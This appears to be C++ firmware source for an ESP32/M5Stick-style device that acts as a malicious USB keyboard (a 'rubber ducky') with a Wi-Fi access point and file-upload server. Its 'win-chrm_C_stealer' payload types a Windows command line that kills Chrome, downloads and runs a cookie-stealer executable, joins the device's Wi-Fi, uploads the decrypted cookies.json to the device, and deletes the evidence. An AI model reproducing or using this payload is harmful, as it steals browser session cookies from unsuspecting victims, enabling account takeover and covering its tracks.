#include <FS.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <WiFiMulti.h>
#include <WiFiClientSecure.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <ESPAsyncWebServer.h>
USBHIDKeyboard Keyboard;
const int buttonPin = 0;
bool screen_dim_dimmedL = false;
int screen_dim_timeL = 30;
int screen_dim_currentL = 0;
String full_files_dir = "/win-chrm/";
String files_dir = "/win-chrm";
String ssid = String("AP-0");
String password = String("decrypted-cookies");
File root;

AsyncWebServer server(80);

struct MENUL {
  char name[19];
  int command;
};

void demo_android(){ // 2
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("android demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_ios(){ // 3
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("ios demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_macos(){ // 4
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("macos demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.printf(TXT_SEL_BACK);
}

void demo_windows(){ // 5
    Keyboard.begin();
    USB.begin();
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println("windows demo");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.println("Running payload...");
    delay(2000);   
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("cmd");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print(GET_ASCII_ART);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    DISP.print("done.");
    DISP.printf(TXT_SEL_BACK);
}

bool createDir(fs::FS &fs, const char * path){
  Serial.printf("Creating Dir: %s\n", path);
  if(fs.mkdir(path)){
    Serial.println("Dir created/exists");
    return true;
  } else {
    Serial.println("mkdir failed");
    return false;
  }
}

String ip2String(const IPAddress& address){
  return String() + address[0] + "." + address[1] + "." + address[2] + "." + address[3];
}

String printDirectory_listing(File dir, int numTabs) {
  String response = "";
  dir.rewindDirectory();
  // for (uint8_t i=0; i<numTabs; i++) {
  //   Serial.print('\t');   // we'll have a nice indentation
  // }
  while(true) {
    File entry =  dir.openNextFile();
    if (!entry) {
    // no more files
    // Serial.println("**nomorefiles**");
    break;
    }
    // Recurse for directories, otherwise print the file size
    // if (entry.isDirectory()) {
    //   printDirectory_listing(entry, numTabs+1);
    // }
    if (!entry.isDirectory()){
      response += String("<a href='") + String(entry.name()) + String("'>") + String(entry.name()) + String("</a>") + String("</br>");
    }
    entry.close();
  }

  return String("List files in <b>/</b>win-chrm:<br>") + response;
}

String filename_exists(String filename, int count, String filename_original){
  if(SD.exists(full_files_dir+filename)){
    count++;
    char snum[5];
    // Convert 123 to string [buf]
    itoa(count, snum, 10);
    return filename_exists(snum+String("-")+filename_original, count, filename_original);
  } else {
    return filename;
  }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  String logmessage = "Client:" + request->client()->remoteIP().toString() + " " + request->url();
  Serial.println(logmessage);
  String filename_copy = filename;
  if (!index) {
    String toUpload = filename_exists(filename, 0, filename);
    logmessage = "Upload Start: " + String(filename);
    // open the file on first call and store the file handle in the request object
    request->_tempFile = SD.open(full_files_dir+toUpload, FILE_WRITE);
    Serial.println(logmessage);
  }

  if (len) {
    // stream the incoming chunk to the opened file
    request->_tempFile.write(data, len);
    logmessage = "Writing file: " + String(filename) + " index=" + String(index) + " len=" + String(len);
    Serial.println(logmessage);
  }

  if (final) {
    logmessage = "Upload Complete: " + String(filename) + ",size: " + String(index + len);
    // close the file handle as the upload is now done
    request->_tempFile.close();
    Serial.println(logmessage);
    request->redirect("/");
  }
}

IPAddress runPayloadServer(){
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  DISP.println("SSID: "+ssid);
  DISP.println("PSW: "+password);
  server.serveStatic("/", SD, full_files_dir.c_str());
  // Serve the HTML file as the default route
  server.on("/", [](AsyncWebServerRequest *request){
    root = SD.open(files_dir);
    String res = printDirectory_listing(root, 0);
    request->send(200, "text/html", res);
  });

  // Route to handle file upload
  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
        request->send(200);
      }, handleUpload);
  // Start server
  server.begin();

  DISP.println("HTTP server started");
  DISP.print("@ http://");
  DISP.print(IP);
  return IP;
}

void run_payload_setup(){
  Keyboard.begin();
  USB.begin();
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  IPAddress IP = runPayloadServer();
  String str = ip2String(IP);
  String cmd = "taskkill /F /IM chrome.exe /T" \
  " & cd \".\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\"" \
  " && curl -L https://github.com/illera88/GCC-stealer/releases/download/v0.1.1/GCC-stealer.exe -o GCC-stealer.exe" \
  " && curl -L https://github.com/usg-ishimura/m5stick-nemo/releases/download/v0.1/Wi-Fi-AP-0.xml -o Wi-Fi-AP-0.xml" \
  /*" && netsh wlan delete profile "+ssid+"" \*/
  " && netsh wlan add profile filename=\".\\Wi-Fi-AP-0.xml\"" \
  " && netsh wlan connect name="+ssid+"" \
  " && .\\GCC-stealer.exe --json-file" \
  " && timeout /t 5" \
  " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
  /*" & netsh wlan disconnect" \*/
  " & netsh wlan delete profile "+ssid+"" \
  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";

  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println("Running payload...");
  delay(2000);   
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print(cmd);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  DISP.print("done.");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf(TXT_SEL_BACK);
}

void rootPayload0(){
    if(!setupSdCard()){
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
        DISP.printf(TXT_SEL_BACK);
    } else {
      if(createDir(SD, PYLD_DIR)){
        run_payload_setup();
      } else {
        rstOverride = true;
        isSwitching = false;
        DISP.fillScreen(BGCOLOR);
        DISP.setCursor(0, 0);
        DISP.setTextColor(FGCOLOR, BGCOLOR);
        DISP.setTextSize(SMALL_TEXT);
        DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
        DISP.printf(TXT_SEL_BACK);
      }
    }
}

static MENUL bumenu[] = { // edit this to add payloads!
  { TXT_BACK, 0},
  { "win-chrm_C_stealer", 1},
  { "demo_android", 2},
  { "demo_ios", 3},
  { "demo_macos", 4},
  { "demo_windows", 5},
};

int bumenu_size = sizeof(bumenu) / sizeof (MENUL);

void payloads_menu(int option){ // edit this to add payloads!
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
      case 1:
        rootPayload0();
        break;
      case 2:
        demo_android();
        break;
      case 3:
        demo_ios();
        break;
      case 4:
        demo_macos();
        break;
      case 5:
        demo_windows();
        break;
    }
}

void drawmenuL() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = bumenu_size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < bumenu_size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",bumenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}